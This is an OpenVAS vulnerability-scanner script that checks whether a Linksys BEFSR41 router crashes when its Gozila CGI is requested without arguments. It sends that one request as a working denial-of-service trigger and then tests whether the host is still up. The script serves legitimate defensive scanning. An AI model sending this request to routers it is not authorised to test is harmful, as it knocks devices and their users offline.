###############################################################################
# OpenVAS Vulnerability Test
# $Id: linksys_gozila_cgi_DoS.nasl 10322 2018-06-26 06:37:28Z cfischer $
#
# Linksys Gozila CGI denial of service
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2003 Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# References:
#
# From: "David Endler" <dendler@idefense.com>
# To: vulnwatch@vulnwatch.org
# Date: Thu, 31 Oct 2002 21:09:10 -0500
# Subject: iDEFENSE Security Advisory 10.31.02a: Denial of Service Vulnerability in Linksys BEFSR41 EtherFast Cable/DSL Router
#
# http://www.linksys.com/products/product.asp?prid=20&grid=23

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.11773");
  script_version("$Revision: 10322 $");
  script_tag(name:"last_modification", value:"$Date: 2018-06-26 08:37:28 +0200 (Tue, 26 Jun 2018) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("Linksys Gozila CGI denial of service");
  script_category(ACT_KILL_HOST);
  script_copyright("This script is Copyright (C) 2003 Michel Arboi");
  script_family("Denial of Service");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"Upgrade your router firmware to 1.42.7.");

  script_tag(name:"summary", value:"The Linksys BEFSR41 EtherFast Cable/DSL Router crashes
  if somebody accesses the Gozila CGI without argument on the web administration interface.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");

port = get_http_port(default:80);

start_denial();

# Maybe we should look into the misc CGI directories?
req = http_get(port: port, item: "/Gozila.cgi?");
http_send_recv(port: port, data:req);

alive = end_denial();
if (! alive) security_message(port:port);
